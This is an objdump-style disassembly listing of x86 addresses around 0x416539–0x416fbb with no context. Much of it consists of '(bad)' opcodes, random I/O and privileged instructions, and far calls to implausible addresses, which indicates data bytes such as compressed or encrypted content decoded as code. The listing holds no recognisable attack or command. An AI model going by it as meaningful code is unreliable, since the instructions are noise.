  416539:	adc    eax,0x63a953f8
  41653e:	ins    DWORD PTR es:[edi],dx
  41653f:	sbb    ch,BYTE PTR [ecx+0x369c79c9]
  416545:	sti    
  416546:	es mov ecx,0x59de3d3e
  41654c:	mov    bh,0xba
  41654e:	into   
  41654f:	shl    DWORD PTR [ebp+0x48652e81],cl
  416555:	test   eax,0xca581ada
  41655a:	out    0x6b,al
  41655c:	adc    edi,DWORD PTR [eax-0x1f0d553]
  416562:	push   0x381d370d
  416567:	(bad)  [edi]
  416569:	jb     0x416504
  41656b:	ret    
  41656c:	push   0x9a508638
  416571:	lahf   
  416572:	sub    BYTE PTR [ebp-0x6af10317],ah
  416578:	ret    
  416579:	pop    ss
  41657a:	dec    esi
  41657b:	jg     0x4165da
  41657d:	adc    eax,0x6078a592
  416582:	stos   BYTE PTR es:[edi],al
  416583:	in     eax,dx
  416584:	shl    BYTE PTR [edx],cl
  416586:	jecxz  0x4165dc
  416588:	test   eax,0x58c0d257
  41658d:	fbld   TBYTE PTR [ebx+0xd2]
	...
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x3f4fbcac]
  416601:	stc    
  416602:	rol    DWORD PTR [ebx+0xec44],0x4
  416609:	add    DWORD PTR [eax],eax
  41660b:	add    BYTE PTR [ebp-0x593d021a],ah
  416611:	scas   eax,DWORD PTR es:[edi]
  416612:	pop    edi
  416613:	mov    esi,0x88d7d0b8
  416618:	jp     0x416628
  41661a:	ret    
  41661b:	pop    es
  41661c:	mov    ds:0xf3b69300,eax
  416621:	mov    ebp,0xc6688736
  416626:	ret    0xfd4b
  416629:	loop   0x4166a4
  41662b:	(bad)  
  41662c:	fdivr  QWORD PTR [ebx-0x7f]
  41662f:	in     eax,0x8f
  416631:	fidiv  DWORD PTR [ebx+0x1e7681b1]
  416637:	jle    0x4166b7
  416639:	add    edx,edx
  41663b:	(bad)  
  41663c:	cmp    ebp,DWORD PTR [edx+0x68]
  41663f:	pop    edi
  416640:	pop    esi
  416641:	bound  esi,QWORD PTR [ecx+0x10d93a4b]
  416647:	mov    edi,0x80944853
  41664c:	and    eax,0x286fbbce
  416651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416652:	cmc    
  416653:	pushf  
  416654:	lahf   
  416655:	sbb    bh,BYTE PTR [edi]
  416657:	mov    bl,0xc
  416659:	inc    esi
  41665a:	aam    0xe9
  41665c:	xlat   BYTE PTR ds:[ebx]
  41665d:	xchg   edx,eax
  41665e:	(bad)  
  41665f:	jmp    0x4166a5
  416661:	dec    esi
  416662:	mov    eax,ss
  416664:	sub    cl,BYTE PTR [edi]
  416666:	push   ecx
  416667:	mov    esp,0x84ef7a44
  41666c:	add    eax,0x1376f030
  416671:	sbb    ecx,DWORD PTR [eax-0x76bc8476]
  416677:	leave  
  416678:	addr16 call 0x5ead:0x1ce5eb32
  416680:	addr16 mov dh,dh
  416683:	outs   dx,DWORD PTR ds:[esi]
  416684:	pop    ebx
  416685:	jne    0x416613
  416687:	rcl    BYTE PTR [ebx+0x6171ed0c],cl
  41668d:	out    dx,eax
  41668e:	not    BYTE PTR [edi+0x2703bfd7]
  416694:	aam    0xe9
  416696:	xchg   edx,eax
  416697:	pushf  
  416698:	ins    DWORD PTR es:[edi],dx
  416699:	loope  0x4166d7
  41669b:	jg     0x4166b9
  41669d:	cmp    DWORD PTR [ebx+0x2556ce7a],edi
  4166a3:	and    BYTE PTR [ebp-0x5d13bb54],0x77
  4166aa:	sbb    bl,BYTE PTR [edx]
  4166ac:	icebp  
  4166ad:	stos   BYTE PTR es:[edi],al
  4166ae:	lahf   
  4166af:	pop    es
  4166b0:	int    0xab
  4166b2:	(bad)
  4166b5:	sti    
  4166b6:	and    al,BYTE PTR [edx+0x5b]
  4166b9:	(bad)  
  4166bc:	sub    eax,0xb665d5f5
  4166c1:	cmp    bh,dl
  4166c3:	aas    
  4166c4:	ins    BYTE PTR es:[edi],dx
  4166c5:	mov    ds:0xd93c7026,eax
  4166ca:	mov    dh,0x14
  4166cd:	and    esi,edx
  4166cf:	jno    0x4166b0
  4166d1:	enter  0x19f5,0x15
  4166d5:	int    0x29
  4166d7:	inc    ecx
  4166d8:	(bad)  
  4166da:	push   es
  4166db:	out    dx,eax
  4166dc:	test   DWORD PTR [ebp-0x5],edx
  4166df:	push   cs
  4166e0:	xchg   ebp,eax
  4166e1:	repnz (bad) 
  4166e3:	sahf   
  4166e4:	out    dx,eax
  4166e5:	jg     0x416756
  4166e7:	neg    DWORD PTR [ebx-0x34]
  4166ea:	mov    cl,0xf5
  4166ec:	shl    DWORD PTR [edi-0x5f],0xb7
  4166f0:	jmp    0x510d:0xdf40686b
  4166f7:	add    bl,BYTE PTR [ebx+0x2c]
  4166fa:	pop    ss
  4166fb:	jecxz  0x416698
  4166fd:	loop   0x416772
  4166ff:	(bad)  
  416700:	ror    bh,cl
  416702:	js     0x4166f7
  416704:	mov    ebx,0x2920b701
  416709:	cli    
  41670a:	add    ebx,esp
  41670c:	inc    ebp
  41670d:	inc    DWORD PTR [edi+0x17]
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	push   ss
  416781:	jno    0x4167bf
  416783:	hlt    
  416784:	dec    eax
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	sahf   
  41678d:	sub    al,0xed
  41678f:	sub    eax,0xe6fb9d4
  416794:	inc    esi
  416795:	dec    eax
  416796:	nop
  416797:	das    
  416798:	jp     0x4167ad
  41679a:	in     eax,0x4e
  41679c:	sub    al,0x8b
  41679e:	jne    0x4167af
  4167a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167a1:	jb     0x416758
  4167a3:	xchg   ebx,eax
  4167a4:	jb     0x4167ac
  4167a6:	sbb    DWORD PTR [esi],0xdaae7cb5
  4167ac:	sub    DWORD PTR ss:[edx-0x31],ebx
  4167b0:	fmul   DWORD PTR [eax+0x69]
  4167b3:	push   ecx
  4167b4:	jecxz  0x416820
  4167b6:	(bad)  
  4167b7:	mov    edi,0xc27d579e
  4167bc:	ds out dx,ax
  4167bf:	rol    DWORD PTR [edx-0x4d],0xc1
  4167c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167c4:	je     0x416763
  4167c6:	out    0xd0,eax
  4167c8:	jo     0x416757
  4167ca:	and    al,0xeb
  4167cc:	xlat   BYTE PTR ds:[ebx]
  4167cd:	mov    ebp,0xa2c3c0d9
  4167d2:	mov    ch,0x4e
  4167d4:	bound  edx,QWORD PTR [edi]
  4167d6:	push   esp
  4167d7:	dec    ecx
  4167d8:	push   ecx
  4167d9:	inc    edi
  4167da:	enter  0xa432,0xea
  4167de:	fwait
  4167df:	inc    esp
  4167e0:	leave  
  4167e1:	sbb    ch,bl
  4167e3:	pusha  
  4167e4:	push   ebx
  4167e5:	push   edx
  4167e6:	add    edx,edi
  4167e8:	sbb    DWORD PTR [edi],edx
  4167ea:	lods   eax,DWORD PTR ds:[esi]
  4167eb:	xabort 0xae
  4167ee:	mov    cl,0xe4
  4167f0:	bound  esi,QWORD PTR [ebp+edx*4+0x6]
  4167f4:	mov    dl,0x80
  4167f6:	pop    ebx
  4167f7:	iret   
  4167f8:	cmp    BYTE PTR [esi-0x6c3c3de],cl
  4167fe:	pop    ds
  4167ff:	cwde   
  416800:	mov    ds:0x7651256e,eax
  416805:	in     al,dx
  416806:	jge    0x416795
  416808:	mov    ecx,0xe685f9c3
  41680d:	lock mov esp,0x19f48b95
  416813:	div    BYTE PTR [eax-0x20]
  416816:	fistp  WORD PTR [edx-0x408a8ffd]
  41681c:	add    ah,BYTE PTR [edi]
  41681e:	push   ds
  41681f:	xchg   esp,eax
  416820:	push   ecx
  416821:	aas    
  416822:	std    
  416823:	ja     0x416868
  416825:	dec    ebx
  416826:	in     eax,dx
  416827:	shr    DWORD PTR fs:[edi+esi*2],1
  41682b:	scas   eax,DWORD PTR es:[edi]
  41682c:	cmp    DWORD PTR ds:0xbf561b12,edi
  416832:	out    0x13,al
  416834:	jb     0x416834
  416836:	pop    eax
  416837:	test   edi,eax
  416839:	js     0x416849
  41683b:	add    ebp,DWORD PTR [ecx-0x6c]
  41683e:	shl    BYTE PTR [edx+0x45],cl
  416841:	pop    eax
  416842:	pop    ebx
  416843:	add    al,0xdd
  416845:	ret    
  416846:	es xchg ebx,eax
  416848:	sub    bh,dl
  41684a:	jle    0x416843
  41684c:	pop    ds
  41684d:	sbb    ebp,DWORD PTR [eax-0x3aeccd6f]
  416853:	jge    0x4167e8
  416855:	mov    ebx,0x5b394b8a
  41685a:	pushf  
  41685b:	xchg   ebx,eax
  41685c:	jmp    0x41686d
  41685e:	call   DWORD PTR [ecx+0x68]
  416861:	xchg   esp,eax
  416862:	lahf   
  416863:	stos   BYTE PTR es:[edi],al
  416864:	mov    bl,0x54
  416866:	outs   dx,BYTE PTR ds:[esi]
  416867:	sub    eax,0xe2de18ac
  41686c:	jmp    DWORD PTR [esi-0x14a2e203]
  416872:	std    
  416873:	mov    DWORD PTR [ecx],eax
  416875:	call   0x2dfb:0x8ef053b
  41687c:	gs mov bl,0x4e
  41687f:	call   0x6de06120
  416884:	test   al,0x6a
  416886:	push   es
  416887:	or     edx,DWORD PTR [ecx+0x36]
  41688a:	lock fcomp DWORD PTR [eax]
  41688d:	call   0x0:0xcb00
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x30eca168
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	jmp    FWORD PTR [esi-0x2dd82646]
  416912:	fs call 0xc5301c79
  416918:	adc    ebp,ebx
  41691a:	(bad)
  41691e:	lock jno 0x416984
  416921:	jg     0x4168ab
  416923:	push   ds
  416924:	stc    
  416925:	sar    BYTE PTR [ebx+0x2],0xd5
  416929:	scas   al,BYTE PTR es:[edi]
  41692a:	aad    0x4
  41692c:	jg     0x4168e4
  41692e:	arpl   WORD PTR [ecx-0x3c],si
  416931:	shr    BYTE PTR [ecx],1
  416933:	frstor [edx-0x27361971]
  416939:	test   DWORD PTR [ecx-0x7a],esp
  41693c:	xchg   edi,eax
  41693d:	pop    eax
  41693e:	repz aam 0x61
  416941:	or     eax,0xaf27398c
  416946:	out    0x1e,al
  416948:	jns    0x4168e1
  41694a:	not    ah
  41694c:	inc    esi
  41694d:	cmp    DWORD PTR [eax+0x4b],edi
  416950:	adc    eax,esi
  416952:	or     dl,bl
  416954:	push   ss
  416955:	mov    edx,0xf9671346
  41695a:	inc    edi
  41695b:	push   esi
  41695c:	xchg   ecx,eax
  41695d:	mov    eax,0xece58ecc
  416962:	(bad)  
  416963:	fidivr DWORD PTR [edi]
  416965:	aad    0xd0
  416967:	mov    ebp,0xb1b8b6c2
  41696c:	lock in al,0x6b
  41696f:	(bad)  
  416970:	mov    esp,0x777493b2
  416975:	push   cs
  416976:	dec    edx
  416977:	sbb    eax,0xb6311376
  41697c:	enter  0xfddd,0x63
  416980:	sti    
  416981:	fld    QWORD PTR [esi]
  416983:	xor    eax,0x3c0af1bc
  416988:	sti    
  416989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41698a:	ret    0xe4c9
  41698d:	aas    
  41698e:	pop    edi
  41698f:	mov    al,ds:0xe41a48ab
  416994:	retf   0xd419
  416997:	dec    ecx
  416998:	jecxz  0x416921
  41699a:	fadd   DWORD PTR [edx-0x2d3af2e]
  4169a0:	dec    DWORD PTR [edx+edi*1-0x60]
  4169a4:	and    al,0xd2
  4169a6:	dec    ebx
  4169a7:	jle    0x416973
  4169a9:	cmp    cl,BYTE PTR [ebp-0x78]
  4169ac:	sbb    DWORD PTR [ebp+0x39],0xffffffcd
  4169b0:	and    BYTE PTR [edi-0x291458d7],cl
  4169b6:	mov    BYTE PTR [ecx-0x1a],0xfa
  4169ba:	pop    es
  4169bb:	daa    
  4169bc:	mov    dh,0xbb
  4169be:	(bad)  
  4169bf:	or     dl,BYTE PTR [ebp+ecx*2-0xd]
  4169c3:	mov    ch,0x4
  4169c5:	(bad)  
  4169c6:	repnz fdivr DWORD PTR [edi+0x14]
  4169ca:	or     eax,0x3942f41b
  4169cf:	ja     0x4169bf
  4169d1:	xchg   esp,eax
  4169d2:	sahf   
  4169d3:	jbe    0x4169ce
  4169d5:	sbb    esi,DWORD PTR [ebp-0x4a]
  4169d8:	adc    esi,DWORD PTR ds:0xb524481f
  4169de:	mov    edx,0x7078d957
  4169e3:	jo     0x4169b6
  4169e5:	bound  edx,QWORD PTR [edi]
  4169e7:	inc    ebx
  4169e8:	pop    edi
  4169e9:	popf   
  4169ea:	repz push 0x978a7b
  4169f0:	pop    esp
  4169f1:	sahf   
  4169f2:	dec    ecx
  4169f3:	mov    bl,0xf0
  4169f5:	inc    esp
  4169f6:	mov    BYTE PTR [ecx],bl
  4169f8:	rol    edx,0x41
  4169fb:	arpl   si,dx
  4169fd:	call   0x7f:0x70c03161
  416a04:	test   BYTE PTR [eax+0x44824acf],al
  416a0a:	inc    DWORD PTR [eax]
  416a0c:	fidiv  DWORD PTR [ecx+0x318f]
	...
  416a72:	add    BYTE PTR [eax],al
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x873f0ba3
  416a82:	push   cs
  416a83:	(bad)  
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	in     al,dx
  416a8d:	(bad)  
  416a8e:	jbe    0x416a9c
  416a90:	call   0x5abf:0x8c006ee
  416a97:	sbb    BYTE PTR [edx],bh
  416a99:	ret    
  416a9a:	mov    edi,0x693625a5
  416a9f:	xor    DWORD PTR [edx+0x27],ebp
  416aa2:	pop    ebp
  416aa3:	daa    
  416aa4:	call   0x435cded1
  416aa9:	xchg   ecx,eax
  416aaa:	jmp    0x57b63775
  416aaf:	cmp    BYTE PTR [esp+ebx*1-0xda4c4c8],0x15
  416ab7:	sub    cl,dh
  416ab9:	and    al,0xe9
  416abb:	aaa    
  416abc:	nop
  416abd:	push   ecx
  416abe:	popa   
  416abf:	lods   al,BYTE PTR ds:[esi]
  416ac0:	jp     0x416a8e
  416ac2:	repz sub al,0x88
  416ac5:	adc    cl,BYTE PTR [ebx+0x5e59bc0e]
  416acb:	js     0x416aff
  416acd:	pop    es
  416ace:	dec    eax
  416acf:	scas   eax,DWORD PTR es:[edi]
  416ad0:	mov    ecx,ebp
  416ad2:	inc    ecx
  416ad3:	aaa    
  416ad4:	mov    gs,WORD PTR ds:0x12705cb2
  416ada:	std    
  416adb:	push   eax
  416adc:	clc    
  416add:	loop   0x416b22
  416adf:	push   es
  416ae0:	sbb    al,0xff
  416ae2:	inc    esi
  416ae3:	inc    esp
  416ae4:	(bad)  
  416ae5:	fist   DWORD PTR [ebx-0x66488900]
  416aeb:	mul    DWORD PTR [eax+ecx*4-0x2e248734]
  416af2:	add    al,0x63
  416af4:	push   edi
  416af5:	js     0x416ab9
  416af7:	cli    
  416af8:	jge    0x416ade
  416afa:	mov    al,0x16
  416afc:	fcmovne st,st(4)
  416afe:	rcl    DWORD PTR [ecx+0x390260b9],1
  416b04:	aaa    
  416b05:	nop
  416b06:	pop    edx
  416b07:	fimul  DWORD PTR [ecx-0x1f]
  416b0a:	dec    ebp
  416b0b:	inc    eax
  416b0c:	fimul  WORD PTR [edx-0x76]
  416b0f:	jns    0x416af3
  416b11:	mov    BYTE PTR [ecx],cl
  416b13:	in     al,0xec
  416b15:	std    
  416b16:	stos   DWORD PTR es:[edi],eax
  416b17:	sahf   
  416b18:	mov    BYTE PTR [ebp+0xb531382],al
  416b1e:	mov    ebx,DWORD PTR [eax-0x759383b3]
  416b24:	sbb    dl,BYTE PTR [ebp+ecx*2+0xb21a3b6]
  416b2b:	and    eax,0xfb17bbad
  416b30:	pop    esp
  416b31:	(bad)  
  416b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b33:	sub    BYTE PTR [ebp-0x3b],ch
  416b36:	sub    BYTE PTR [edi+0x7c],ah
  416b39:	jnp    0x416bac
  416b3b:	mov    ebx,0xe88c75cc
  416b40:	ret    0x3481
  416b43:	les    ebp,FWORD PTR [edi+0x2b]
  416b46:	push   eax
  416b47:	loopne 0x416b84
  416b49:	add    ch,BYTE PTR [ebp-0x3fdf1eb3]
  416b4f:	out    dx,eax
  416b50:	sub    al,0x9b
  416b52:	push   eax
  416b53:	xor    eax,0xe79aa25b
  416b58:	adc    esp,DWORD PTR [esi-0xb]
  416b5b:	and    DWORD PTR [eax+0x6],eax
  416b5e:	add    ch,dh
  416b60:	scas   al,BYTE PTR es:[edi]
  416b61:	push   ds
  416b62:	fld    QWORD PTR [edi+0xe]
  416b65:	cld    
  416b66:	inc    ecx
  416b67:	xor    ebp,DWORD PTR [ecx]
  416b69:	rcr    DWORD PTR [ebp+0x1775b675],0x2a
  416b70:	adc    esi,ebp
  416b72:	(bad)  
  416b73:	pop    ss
  416b74:	pop    ebp
  416b75:	push   ebp
  416b76:	mov    bh,0x18
  416b78:	xor    eax,0x4ab64624
  416b7d:	add    eax,0x992e3c0b
  416b82:	adc    eax,0xe381e6c1
  416b87:	ret    
  416b88:	xor    BYTE PTR [eax-0x3f],bh
  416b8b:	dec    ecx
  416b8c:	or     BYTE PTR [bp+di+0x1e],0x0
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xaf5b70a9
  416c01:	std    
  416c02:	adc    esp,ebp
  416c04:	push   esp
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	fs pop ecx
  416c0e:	or     eax,DWORD PTR [edi]
  416c10:	jae    0x416bd9
  416c12:	xchg   DWORD PTR [ebx+eax*8-0x50d01b97],esi
  416c19:	popa   
  416c1a:	(bad)  
  416c1b:	in     al,0xee
  416c1d:	adc    al,0x6
  416c1f:	sbb    edi,DWORD PTR [edx]
  416c21:	xor    BYTE PTR [esi],bl
  416c23:	mov    ebx,0xe291768b
  416c28:	xchg   edi,eax
  416c29:	or     BYTE PTR [ecx+0x11],cl
  416c2c:	ret    
  416c2d:	loopne 0x416c80
  416c2f:	mov    ebp,0x2a108eff
  416c34:	es pop edx
  416c36:	push   edx
  416c37:	sbb    al,0x37
  416c39:	mov    DWORD PTR [edx-0x66a2d320],edi
  416c3f:	bound  ebx,QWORD PTR [ebx+ecx*1-0x6e30a023]
  416c46:	jno    0x416c33
  416c48:	inc    eax
  416c49:	dec    ebp
  416c4a:	fist   WORD PTR [ecx]
  416c4c:	jae    0x416bec
  416c4e:	stc    
  416c4f:	test   DWORD PTR [ebp+0x47],ecx
  416c52:	shl    ebp,cl
  416c54:	dec    ecx
  416c55:	xor    eax,0xf9875b52
  416c5a:	push   ebx
  416c5b:	dec    ebp
  416c5c:	xor    DWORD PTR [ecx],ebp
  416c5e:	jle    0x416c8f
  416c60:	out    dx,eax
  416c61:	in     al,0xd4
  416c63:	sbb    DWORD PTR [ecx],esp
  416c65:	(bad)  
  416c66:	into   
  416c67:	sub    ah,BYTE PTR [edx-0x4ea8f2d1]
  416c6d:	mov    WORD PTR [ecx-0x5c18b8c6],gs
  416c73:	sub    DWORD PTR [eax],edi
  416c75:	dec    ecx
  416c76:	outs   dx,DWORD PTR ds:[esi]
  416c77:	lods   eax,DWORD PTR ds:[esi]
  416c78:	test   al,0xf0
  416c7a:	xor    al,0x33
  416c7c:	in     al,0xba
  416c7e:	push   edi
  416c7f:	inc    esp
  416c80:	jmp    0x416c15
  416c82:	pop    edx
  416c83:	mov    es,edx
  416c85:	aad    0x11
  416c87:	mov    ch,0x8
  416c89:	imul   esp,DWORD PTR [edx+0x7d],0x6571edf
  416c90:	xchg   edi,eax
  416c91:	call   0x2730a7b3
  416c96:	adc    edi,ecx
  416c98:	add    DWORD PTR [edx+eiz*8],eax
  416c9b:	xchg   esi,eax
  416c9c:	inc    esp
  416c9d:	pusha  
  416c9e:	jno    0x416c6d
  416ca0:	ret    
  416ca1:	sbb    al,0x40
  416ca3:	xor    DWORD PTR [ebp+0x371ad555],esi
  416ca9:	mov    cl,0xa2
  416cab:	aaa    
  416cac:	scas   al,BYTE PTR es:[edi]
  416cad:	std    
  416cae:	and    dh,BYTE PTR [edi]
  416cb0:	mov    ebx,0xb7f3d8f6
  416cb5:	add    DWORD PTR [edi+0x5b],ecx
  416cb8:	std    
  416cb9:	cmp    eax,0xa1436661
  416cbe:	lds    ebp,FWORD PTR [ecx+0x44]
  416cc1:	xchg   ebp,eax
  416cc2:	(bad)
  416cc6:	xor    eax,ecx
  416cc8:	xor    eax,0xca2d606e
  416ccd:	lods   al,BYTE PTR ds:[esi]
  416cce:	mov    al,ds:0xefc5f3e7
  416cd3:	mov    ah,0x6f
  416cd5:	pop    esp
  416cd6:	rol    BYTE PTR [ecx-0x7c],1
  416cd9:	mov    edx,0x5425c134
  416cde:	lods   al,BYTE PTR ds:[esi]
  416cdf:	sbb    eax,0x83b8e3ee
  416ce4:	push   es
  416ce5:	dec    esi
  416ce6:	aaa    
  416ce7:	pushf  
  416ce8:	sub    eax,0xefd55026
  416ced:	sub    al,0x9f
  416cef:	jmp    0x60cfe3ea
  416cf4:	dec    edi
  416cf5:	push   cs
  416cf6:	cmp    eax,0x4698e135
  416cfb:	mov    eax,0xddad8ee2
  416d00:	fdivr  DWORD PTR [ecx+0x7d]
  416d03:	xchg   DWORD PTR [edx-0x7ecb01bf],esp
  416d09:	mov    ebx,DWORD PTR [edi-0x33af6abc]
  416d0f:	into   
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	xchg   ebx,eax
  416d81:	xchg   ecx,eax
  416d82:	in     eax,0x19
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	pop    ebp
  416d8d:	jl     0x416ddc
  416d8f:	add    dh,dl
  416d91:	adc    ch,BYTE PTR [edx-0x6f]
  416d94:	cmp    DWORD PTR [ebx+edx*8-0x3487c5d],edx
  416d9b:	jecxz  0x416de9
  416d9d:	fwait
  416d9e:	icebp  
  416d9f:	mov    ah,0x14
  416da1:	sbb    eax,0x200c9e26
  416da6:	or     esi,ebp
  416da8:	fadd   QWORD PTR [edi]
  416daa:	xor    al,0xa7
  416dac:	outs   dx,BYTE PTR ds:[esi]
  416dad:	out    0xc7,al
  416daf:	inc    ebx
  416db0:	das    
  416db1:	sub    eax,0x58e04c80
  416db6:	outs   dx,BYTE PTR ds:[esi]
  416db7:	loope  0x416dcd
  416db9:	xor    bh,dl
  416dbb:	inc    esp
  416dbc:	mov    WORD PTR [esi-0x7b],ds
  416dbf:	xchg   esp,eax
  416dc0:	sar    dh,1
  416dc2:	fisubr WORD PTR [esi-0x5e8e8a27]
  416dc8:	xlat   BYTE PTR ds:[ebx]
  416dc9:	jle    0x416dfa
  416dcb:	mov    eax,ds:0x15c59a5a
  416dd0:	aam    0x8b
  416dd2:	sbb    al,BYTE PTR [ecx]
  416dd4:	sub    ah,BYTE PTR [ebp+0x74fff3fe]
  416dda:	fadd   st(2),st
  416ddc:	pop    esp
  416ddd:	call   0x59f8:0x5e190ecf
  416de4:	sub    esi,edx
  416de6:	pop    ss
  416de7:	out    0xf1,al
  416de9:	lock sbb dl,BYTE PTR gs:[edi]
  416ded:	jecxz  0x416d74
  416def:	js     0x416de0
  416df1:	mov    ah,0xcb
  416df3:	frstor [edx]
  416df5:	test   al,0x57
  416df7:	pop    esi
  416df8:	cmp    ebp,DWORD PTR [ebp+0x28a8aafc]
  416dfe:	adc    eax,0x4e065572
  416e03:	loop   0x416dad
  416e05:	addr16 or al,dh
  416e08:	cdq    
  416e09:	inc    eax
  416e0a:	cmc    
  416e0b:	shl    ebp,1
  416e0d:	cwde   
  416e0e:	outs   dx,BYTE PTR ds:[esi]
  416e0f:	fwait
  416e10:	dec    eax
  416e12:	and    BYTE PTR [ebx+0x57],bh
  416e15:	xchg   cl,bl
  416e17:	sar    BYTE PTR ss:[ecx+ecx*4],0xb5
  416e1c:	mov    ds:0x6b74cf5d,eax
  416e21:	and    ch,BYTE PTR [edx+0xee84548]
  416e27:	popf   
  416e28:	popa   
  416e29:	sub    DWORD PTR [esi-0x4b],esi
  416e2c:	inc    ebp
  416e2d:	xchg   ecx,eax
  416e2e:	aaa    
  416e2f:	lods   eax,DWORD PTR ds:[esi]
  416e30:	adc    dl,BYTE PTR [edx+0x5]
  416e33:	ret    0xb1d6
  416e36:	adc    DWORD PTR [edx-0x599e83c4],0x26
  416e3d:	adc    cl,dl
  416e3f:	imul   esp,DWORD PTR [esi-0x33],0x72
  416e43:	push   edx
  416e44:	pop    ds
  416e45:	in     al,0xce
  416e47:	lds    esi,FWORD PTR [eax+0x5989bdf5]
  416e4d:	enter  0x696a,0xab
  416e51:	cs loope 0x416e23
  416e54:	sbb    eax,DWORD PTR [esi]
  416e56:	inc    edx
  416e57:	mov    cl,0xf9
  416e59:	sub    ebx,DWORD PTR [esi]
  416e5b:	xchg   BYTE PTR [eax+0x7e6c5cf],ah
  416e61:	jp     0x416ebd
  416e63:	dec    esp
  416e64:	xor    BYTE PTR [ebp+0x18],ch
  416e67:	or     ch,ah
  416e69:	retf   
  416e6a:	and    BYTE PTR [eax+0x27],cl
  416e6d:	push   ecx
  416e6e:	fiadd  DWORD PTR [ebp-0x762a86b1]
  416e74:	in     al,dx
  416e75:	or     cl,BYTE PTR [esi]
  416e77:	cmp    eax,0x2a5c41b2
  416e7c:	aam    0xc6
  416e7e:	push   DWORD PTR [ebx+0x6c4d330c]
  416e84:	call   0xeb04:0xdd5f9751
  416e8b:	sbb    DWORD PTR [ecx+edx*1],edx
  416e8e:	ss aas 
	...
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x462e8eea
  416f02:	mov    bl,0xce
  416f04:	pop    esp
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	out    0xb7,eax
  416f0e:	mov    ds:0xdf2bc99a,eax
  416f13:	add    esi,ecx
  416f15:	fild   QWORD PTR [ecx+0x15]
  416f18:	xor    DWORD PTR [eax-0x7f],edx
  416f1b:	in     al,0x80
  416f1d:	xor    ch,bh
  416f1f:	mov    esp,?
  416f21:	mov    ebx,0x19380380
  416f26:	inc    edx
  416f27:	sti    
  416f28:	dec    eax
  416f29:	hlt    
  416f2a:	and    al,0xbb
  416f2c:	jno    0x416f0a
  416f2e:	xor    DWORD PTR [edi+esi*2],ebp
  416f31:	mov    edi,0x2d48cdbf
  416f36:	(bad)  
  416f37:	in     eax,dx
  416f38:	mov    bh,0x3e
  416f3a:	jle    0x416f28
  416f3c:	pusha  
  416f3d:	push   esi
  416f3e:	sbb    edi,DWORD PTR [edi-0x56a19200]
  416f44:	out    0xea,eax
  416f46:	sub    cl,ch
  416f48:	jns    0x416f6b
  416f4a:	hlt    
  416f4b:	lahf   
  416f4c:	inc    ebp
  416f4d:	sub    ch,dl
  416f4f:	lock and eax,0x2fe50a4d
  416f55:	icebp  
  416f56:	push   es
  416f57:	dec    ecx
  416f58:	cwde   
  416f59:	mov    ecx,0xa5d49939
  416f5e:	mov    DWORD PTR [ebp+0x22cd4d2a],esp
  416f64:	sub    ch,BYTE PTR [eax+ebx*2-0xa1318dc]
  416f6b:	repz les eax,FWORD PTR [ebx-0x74]
  416f6f:	and    al,al
  416f71:	iret   
  416f72:	xor    al,0xf9
  416f74:	fucom  st(2)
  416f76:	ins    DWORD PTR es:[edi],dx
  416f77:	out    0xb2,eax
  416f79:	out    dx,al
  416f7a:	(bad)  
  416f7b:	pop    edi
  416f7c:	jno    0x416fa3
  416f7e:	adc    esp,ecx
  416f80:	xchg   ebp,eax
  416f81:	jecxz  0x416f3f
  416f83:	jp     0x416f40
  416f85:	aad    0xb7
  416f87:	dec    edx
  416f88:	fwait
  416f89:	adc    BYTE PTR [eax+0x1141dc4],0x27
  416f90:	cmp    edx,DWORD PTR [ebx-0x6cb4b148]
  416f96:	xchg   ecx,edi
  416f98:	push   ebx
  416f99:	in     al,0x68
  416f9b:	pop    ss
  416f9c:	pop    es
  416f9d:	mov    ah,0x82
  416f9f:	dec    ecx
  416fa0:	sar    DWORD PTR [ebx+0x2f3c2ebf],1
  416fa6:	mov    eax,ds:0xcf932e9
  416fab:	clc    
  416fac:	aam    0x8e
  416fae:	inc    edx
  416faf:	pusha  
  416fb0:	pushf  
  416fb1:	inc    ebp
  416fb2:	jmp    0x416f57
  416fb4:	push   es
  416fb5:	jge    0x416f55
  416fb7:	inc    esp
  416fb8:	ror    DWORD PTR [edi],0xa
  416fbb:	pop    ebp
